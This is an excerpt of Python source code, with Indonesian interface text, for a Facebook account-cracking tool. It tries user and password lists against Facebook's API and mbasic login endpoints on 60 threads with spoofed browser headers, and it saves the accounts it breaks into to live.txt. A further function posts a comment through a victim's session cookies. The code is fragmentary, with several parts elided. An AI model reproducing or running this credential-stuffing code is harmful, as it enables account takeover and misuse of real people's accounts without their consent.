...
class ngentod:
	...
	def menu(self):
		...
		if len(self.id)==0:
			print("[!] List Id Kosong");waktu(1.5);self.menu()
		else:
			print("\n[?] Pilih Metode Crack")
			print("[01] Crack Dari Api Fb [Crack Cepat, Mungkin CP Semua]")
			print("[02] Crack Dari mbasic [Crack Lumayan Cepat, Mungkin CP Berkurang]")
			self.ngontol()
	...
	def crackmbasic(self,user,pw,urel):
		...
		data={}
		ses=req.Session()
		ses.headers.update({"Host":urel.replace("https://",""),"cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua.useragent,"origin":urel,"referer":urel+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		...
		if "c_user" in d.cookies:
			...
			ok+=1
			print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {coli}          \x1b[0m",end="")
			print("")
			open("live.txt","a").write(user+" | "+pw+" | "+coli+"\n")
			live.append(user+pw+coli)
	...
	def ngontol(self):
		...
		if nanya in[""," "]:
			...
			print("\n[+] Starting Crack..\n[+] Hasil LIVE Tersimpan Di File : live.txt\n[+] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Crack Sedang Berjalan,Harap Tunggu\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=60) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[SagiriWaifuGw:v]")
						xu=xi[1]
...
# Jangan Dirubah Ajg!!!:v
	...
	def komen(self):
		...
		try:
			...
			c={"fb_dtsg":b.group(2),"jazoest":b.group(3),"comment_text":"ngentod"}
			d=req.post(f"{self.url}{b.group(1).replace(';','&')}",cookies=self.kuki,data=c)
		except:pass
	def gettok(self):
		try:
